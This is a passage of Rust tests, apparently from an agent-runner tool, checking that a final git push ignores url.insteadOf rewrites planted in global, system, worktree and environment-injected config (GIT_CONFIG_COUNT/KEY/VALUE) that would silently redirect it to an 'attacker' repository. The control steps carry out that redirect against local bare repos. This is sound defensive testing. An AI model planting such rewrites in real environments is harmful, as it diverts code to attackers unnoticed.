        // RED BASELINE (control): a NON-isolated push of the same refspec to
        // the same trusted URL MUST be rewritten — it lands on the attacker
        // repo and the trusted bare stays untouched. This proves the planted
        // config is live in the very environment the finalize push will
        // inherit, so the isolated assertion below is non-vacuous: a revert of
        // `git_isolated`'s GIT_CONFIG_GLOBAL=/dev/null keeps this control
        // green but turns the trusted-bare assertion red.
        let rewritten = git(
            &[
                "-c".into(),
                "core.hooksPath=/dev/null".into(),
                "push".into(),
                "--".into(),
                trusted.clone(),
                "refs/heads/feat/work:refs/heads/feat/work".into(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await;
        assert!(
            rewritten.is_ok(),
            "control: a non-isolated push must SUCCEED via the rewrite (onto the attacker repo); \
             if this fails the planted config is not live and the test guards nothing — {rewritten:?}"
        );
        let on_attacker = git(
            &[
                "--git-dir".into(),
                attacker.to_string_lossy().into_owned(),
                "rev-parse".into(),
                "--verify".into(),
                "refs/heads/feat/work".into(),
            ],
            None,
            Duration::from_secs(30),
            None,
        )
        .await
        .expect("control: the non-isolated push must land on the ATTACKER repo, proving the \
                 planted insteadOf rewrite redirects the trusted URL");
        let on_trusted_before = git(
            &[
                "--git-dir".into(),
                bare.to_string_lossy().into_owned(),
                "rev-parse".into(),
                "--verify".into(),
                "refs/heads/feat/work".into(),
            ],
            None,
            Duration::from_secs(30),
            None,
        )
        .await;
        assert!(
            on_trusted_before.is_err(),
            "control: the trusted bare must still be untouched before the isolated finalize push \
             (otherwise the control did not exercise the rewrite)"
        );
        // GREEN (isolated): finalize_git spawns git_isolated, which pins
        // GIT_CONFIG_GLOBAL to /dev/null regardless of HOME or the inherited
        // environment, so the planted rewrite is inert and the push reaches
        // the trusted URL.
        let res = finalize_git(&dir, &prep, &repo, Duration::from_secs(30)).await;
        assert!(
            res.pushed,
            "the push must ignore the global insteadOf rewrite and reach the trusted URL"
        );
        let on_remote = git(
            &[
                "--git-dir".into(),
                bare.to_string_lossy().into_owned(),
                "rev-parse".into(),
                "--verify".into(),
                "refs/heads/feat/work".into(),
            ],
            None,
            Duration::from_secs(30),
            None,
        )
        .await;
        // The decisive isolation assertion: the work branch reached the
        // TRUSTED bare. Without the `GIT_CONFIG_GLOBAL=/dev/null` isolation
        // the finalize push is redirected onto the attacker repo — a
        // fast-forward of the control tip (so the attacker repo shows no
        // visible change and `res.pushed` is still true, git having exited 0
        // against the WRONG destination) — leaving the trusted bare WITHOUT
        // the branch. `on_remote` is then Err, and it is this assertion (not
        // `res.pushed`) that a revert of the isolation turns red.
        assert!(
            on_remote.is_ok(),
            "the work branch must land on the trusted URL, not the global-rewritten destination"
        );
        // And the attacker repo must hold only the control push's tip (the
        // finalize push carries the same work-branch tip, so a redirect would
        // be an indistinguishable fast-forward — hence the trusted-bare check
        // above is the real signal; this one just pins the control's state).
        let attacker_tip_after = git(
            &[
                "--git-dir".into(),
                attacker.to_string_lossy().into_owned(),
                "rev-parse".into(),
                "--verify".into(),
                "refs/heads/feat/work".into(),
            ],
            None,
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        assert_eq!(
            on_attacker.trim(),
            attacker_tip_after.trim(),
            "the attacker repo must hold only the control push's tip"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
        let _ = std::fs::remove_dir_all(&fake_home);
        let _ = std::fs::remove_dir_all(&attacker);
    }

    /// Restores an arbitrary set of process-global env vars on drop (for the
    /// transport-isolation tests that bind `GIT_CONFIG_SYSTEM` /
    /// `GIT_CONFIG_COUNT`-style injection into the inherited environment).
    struct EnvVarsGuard(Vec<(&'static str, Option<std::ffi::OsString>)>);
    impl Drop for EnvVarsGuard {
        fn drop(&mut self) {
            for (k, v) in &self.0 {
                match v {
                    Some(v) => std::env::set_var(k, v),
                    None => std::env::remove_var(k),
                }
            }
        }
    }

    /// Spawn a RAW `git` subprocess that inherits the test process's full
    /// environment (no scrub, no isolation), so a planted env/system config is
    /// genuinely live for it. Used as the red-baseline control: it proves the
    /// rewrite fires for a git that does not go through `git_isolated`'s
    /// isolation + the core runner's env scrub.
    fn raw_git_push(dir: &CwdHandle, trusted: &str) -> bool {
        std::process::Command::new("git")
            .args([
                "-c",
                "core.hooksPath=/dev/null",
                "push",
                "--",
                trusted,
                "refs/heads/feat/work:refs/heads/feat/work",
            ])
            .current_dir(dir_path(dir))
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
    }

    /// Does the bare repo at `git_dir` hold `refs/heads/feat/work`?
    async fn bare_has_work(git_dir: &Path) -> bool {
        git(
            &[
                "--git-dir".into(),
                git_dir.to_string_lossy().into_owned(),
                "rev-parse".into(),
                "--verify".into(),
                "refs/heads/feat/work".into(),
            ],
            None,
            Duration::from_secs(30),
            None,
        )
        .await
        .is_ok()
    }

    /// Build the trusted bare + attacker bare + a `feat/work` commit staged for
    /// push. Returns `(run_dir, trusted_bare, attacker_bare, trusted_url,
    /// attacker_url, repo, prep)`.
    async fn iso_fixture(
        tag: &str,
        uniq: &str,
    ) -> (
        CwdHandle,
        PathBuf,
        PathBuf,
        String,
        String,
        crate::envelope::Repository,
        GitPrep,
    ) {
        let dir = git_workspace(tag).await;
        let nonce = || {
            format!(
                "{}-{}",
                std::process::id(),
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_nanos()
            )
        };
        let bare = std::env::temp_dir().join(format!("nano-bare-{tag}-{}", nonce()));
        let attacker = std::env::temp_dir().join(format!("nano-attacker-{tag}-{}", nonce()));
        for b in [&bare, &attacker] {
            git(
                &[
                    "init".into(),
                    "--bare".into(),
                    "--".into(),
                    b.to_string_lossy().into_owned(),
                ],
                Some(&dir),
                Duration::from_secs(30),
                None,
            )
            .await
            .unwrap();
        }
        let trusted = format!("file://{}", bare.display());
        let attacker_url = format!("file://{}", attacker.display());
        let mut repo = test_repo();
        repo.url = trusted.clone();
        let prep = prepare_work_branch(
            &dir,
            &repo,
            None,
            Some("feat/work"),
            true,
            uniq,
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        commit(&dir, "work to push").await;
        (dir, bare, attacker, trusted, attacker_url, repo, prep)
    }

    #[tokio::test]
    async fn finalize_push_ignores_system_insteadof_rewrite() {
        // A `url.*.insteadOf` planted in the SYSTEM config (/etc/gitconfig,
        // bound here via GIT_CONFIG_SYSTEM) would redirect the trusted push
        // off-box just like the global config would. The finalize push must
        // isolate the system tier too (GIT_CONFIG_SYSTEM=/dev/null +
        // GIT_CONFIG_NOSYSTEM=1), so the planted rewrite never applies.
        let (dir, bare, attacker, trusted, attacker_url, repo, prep) =
            iso_fixture("fin-sys-io", "sys1").await;
        let fake_sys = std::env::temp_dir().join(format!(
            "nano-sysconf-{}-{}.cfg",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::write(
            &fake_sys,
            format!("[url \"{attacker_url}\"]\n\tinsteadOf = {trusted}\n"),
        )
        .unwrap();
        let _env_lock = GIT_CONFIG_ENV_LOCK.lock().await;
        let _guard = EnvVarsGuard(vec![
            ("GIT_CONFIG_SYSTEM", std::env::var_os("GIT_CONFIG_SYSTEM")),
            (
                "GIT_CONFIG_NOSYSTEM",
                std::env::var_os("GIT_CONFIG_NOSYSTEM"),
            ),
        ]);
        std::env::set_var("GIT_CONFIG_SYSTEM", &fake_sys);
        std::env::remove_var("GIT_CONFIG_NOSYSTEM");
        // RED BASELINE: a raw git that inherits this env is rewritten onto the
        // attacker, proving the planted system config is live.
        assert!(
            raw_git_push(&dir, &trusted),
            "control: a non-isolated push must SUCCEED via the system-config rewrite"
        );
        assert!(
            bare_has_work(&attacker).await,
            "control: the non-isolated push must land on the ATTACKER repo"
        );
        assert!(
            !bare_has_work(&bare).await,
            "control: the trusted bare must still be untouched before the isolated push"
        );
        // GREEN: finalize isolates the system tier, so the push reaches trusted.
        let res = finalize_git(&dir, &prep, &repo, Duration::from_secs(30)).await;
        assert!(res.pushed, "the isolated push must reach the trusted URL");
        assert!(
            bare_has_work(&bare).await,
            "the work branch must land on the trusted URL, not the system-rewritten destination"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
        let _ = std::fs::remove_dir_all(&attacker);
        let _ = std::fs::remove_file(&fake_sys);
    }

    #[tokio::test]
    async fn finalize_push_ignores_env_config_injection_rewrite() {
        // GIT_CONFIG_COUNT/GIT_CONFIG_KEY_<n>/GIT_CONFIG_VALUE_<n> inject config
        // ABOVE every on-disk file, so a `url.*.insteadOf` planted there bypasses
        // the GIT_CONFIG_GLOBAL/SYSTEM=/dev/null file isolation entirely. The
        // core git runner must scrub these from every git child.
        let (dir, bare, attacker, trusted, attacker_url, repo, prep) =
            iso_fixture("fin-env-io", "env1").await;
        let _env_lock = GIT_CONFIG_ENV_LOCK.lock().await;
        let _guard = EnvVarsGuard(vec![
            ("GIT_CONFIG_COUNT", std::env::var_os("GIT_CONFIG_COUNT")),
            ("GIT_CONFIG_KEY_0", std::env::var_os("GIT_CONFIG_KEY_0")),
            ("GIT_CONFIG_VALUE_0", std::env::var_os("GIT_CONFIG_VALUE_0")),
        ]);
        std::env::set_var("GIT_CONFIG_COUNT", "1");
        std::env::set_var("GIT_CONFIG_KEY_0", format!("url.{attacker_url}.insteadOf"));
        std::env::set_var("GIT_CONFIG_VALUE_0", &trusted);
        // RED BASELINE: a raw git inheriting this env is rewritten onto attacker.
        assert!(
            raw_git_push(&dir, &trusted),
            "control: a non-isolated push must SUCCEED via the env-injected rewrite"
        );
        assert!(
            bare_has_work(&attacker).await,
            "control: the non-isolated push must land on the ATTACKER repo"
        );
        assert!(
            !bare_has_work(&bare).await,
            "control: the trusted bare must still be untouched before the isolated push"
        );
        // GREEN: the core runner scrubs GIT_CONFIG_COUNT/KEY/VALUE, so finalize
        // reaches the trusted URL.
        let res = finalize_git(&dir, &prep, &repo, Duration::from_secs(30)).await;
        assert!(res.pushed, "the scrubbed push must reach the trusted URL");
        assert!(
            bare_has_work(&bare).await,
            "the work branch must land on the trusted URL, not the env-injected destination"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
        let _ = std::fs::remove_dir_all(&attacker);
    }

    #[tokio::test]
    async fn finalize_retains_when_side_branches_exceed_scan_cap() {
        // Even a COMPLETE branch listing is bounded: more than
        // `MAX_SIDE_BRANCH_SCAN` side branches would each cost serial
        // `rev-parse`/`rev-list` processes and let an agent stall finalize past
        // its run timeout. finalize must fail closed (retain, no push) rather
        // than sweep an unbounded set.
        let dir = git_workspace("fin-cap").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            Some("feat/work"),
            true,
            "uu5",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
        // Manufacture more branches than the scan cap.
        for i in 0..(MAX_SIDE_BRANCH_SCAN + 1) {
            git(
                &["branch".into(), format!("filler-{i:04}")],
                Some(&dir),
                Duration::from_secs(30),
                None,
            )
            .await
            .unwrap();
        }
        commit(&dir, "work to push").await;
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(
            res.retain,
            "an over-cap side-branch set must fail closed and retain the run dir"
        );
        assert!(
            !res.pushed,
            "the push is refused when the side-branch scan is unbounded"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_push_scrubs_worktree_insteadof_rewrite() {
        // Companion to the --local/system/env insteadOf tests: a rewrite planted
        // in the WORKTREE scope (`.git/config.worktree`, active once
        // `extensions.worktreeConfig = true`) is INVISIBLE to a `--local` scrub,
        // so without also scrubbing the worktree scope the finalize push would
        // still be silently redirected off-box. The scrub must neutralise the
        // worktree tier too, so the push lands on the TRUSTED destination.
        let (dir, bare, attacker, trusted, attacker_url, repo, prep) =
            iso_fixture("fin-wt-io", "wt1").await;
        // Enable the worktree-config extension, then plant the redirect rewrite
        // in the worktree scope (which `--local` never lists).
        git(
            &[
                "config".into(),
                "--local".into(),
                "extensions.worktreeConfig".into(),
                "true".into(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        git(
            &[
                "config".into(),
                "--worktree".into(),
                format!("url.{attacker_url}.insteadOf"),
                trusted.clone(),
            ],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        // RED BASELINE: a raw git that honours the worktree config is rewritten
        // onto the attacker, proving the planted rewrite is live.
        assert!(
            raw_git_push(&dir, &trusted),
            "control: a non-scrubbed push must SUCCEED via the worktree-config rewrite"
        );
        assert!(
            bare_has_work(&attacker).await,
            "control: the non-scrubbed push must land on the ATTACKER repo"
        );
        assert!(
            !bare_has_work(&bare).await,
            "control: the trusted bare must still be untouched before the scrubbed push"
        );
        // GREEN: finalize scrubs the worktree scope, so the push reaches trusted.
        let res = finalize_git(&dir, &prep, &repo, Duration::from_secs(30)).await;
        assert!(res.pushed, "the scrubbed push must reach the trusted URL");
        assert!(
            bare_has_work(&bare).await,
            "the work branch must land on the trusted URL, not the worktree-rewritten destination"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
        let _ = std::fs::remove_dir_all(&bare);
        let _ = std::fs::remove_dir_all(&attacker);
    }

    #[tokio::test]
    async fn finalize_preserves_own_checkout_branch_when_push_disabled() {
        // Regression: with push disabled AND no `branch.create`, an agent that
        // commits directly on its own checked-out branch must have that branch
        // preserved as the work branch. If `working_branch` were left `None`
        // (the pre-fix behaviour), the side-branch sweep would treat the agent's
        // OWN checkout as a stranded side branch — clearing its commit list and
        // dropping `branch`/`commits` from the completion variables.
        let dir = git_workspace("nopush-own").await;
        let prep = prepare_work_branch(
            &dir,
            &test_repo(),
            None,
            None,
            false,
            "u9",
            Duration::from_secs(30),
        )
        .await;
        assert_eq!(
            prep.working_branch.as_deref(),
            Some("main"),
            "the checked-out branch must be preserved as the work branch even when push is disabled"
        );
        commit(&dir, "work on own checkout").await;
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert_eq!(
            res.branch.as_deref(),
            Some("main"),
            "finalize must report the agent's own checkout as the work branch"
        );
        assert!(
            !res.commits.is_empty(),
            "the agent's commit on its own checkout must be enumerated, not cleared as stranded"
        );
        assert!(
            !res.retain,
            "the agent's own checkout is not stranded work, so the scan must not flag retain"
        );
        assert!(!res.pushed, "push is disabled, so nothing is pushed");
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }

    #[tokio::test]
    async fn finalize_stops_scan_at_first_inconclusive_branch() {
        // Regression: when the provision-time ref snapshot is absent (its
        // enumeration failed), the per-branch sweep cannot prove any side branch
        // pre-existed, so it must fail closed AND STOP at the first branch rather
        // than relaunch a serial `rev-parse`/`rev-list` per branch — an
        // agent-crafted branch graph could otherwise stall the slot for hours
        // (scan cap × per-command timeout). The early return is observable: the
        // post-loop reflog net never runs, so a stranded detached commit does NOT
        // flip `work_found`. `retain` alone already protects the run dir.
        let dir = git_workspace("scan-stop").await;
        let start = git(
            &["rev-parse".into(), "HEAD".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap()
        .trim()
        .to_string();
        git(
            &["checkout".into(), "--detach".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        commit(&dir, "stranded detached commit").await;
        git(
            &["checkout".into(), "main".into(), "--".into()],
            Some(&dir),
            Duration::from_secs(30),
            None,
        )
        .await
        .unwrap();
        let prep = GitPrep {
            working_branch: None,
            want_push: false,
            start_sha: Some(start),
            provision_tips: None,
            provision_shas: None,
        };
        let res = finalize_git(&dir, &prep, &test_repo(), Duration::from_secs(30)).await;
        assert!(
            res.retain,
            "an absent provision snapshot must fail closed and retain the run dir"
        );
        assert!(
            !res.pushed,
            "a retained/incomplete scan must refuse the push"
        );
        assert!(
            !res.work_found,
            "the sweep must STOP at the first inconclusive (snapshot-absent) branch, so the \
             post-loop reflog net never runs and the detached commit does not flip work_found — \
             retain alone protects the dir"
        );
        let _ = std::fs::remove_dir_all(dir_path(&dir));
    }
}
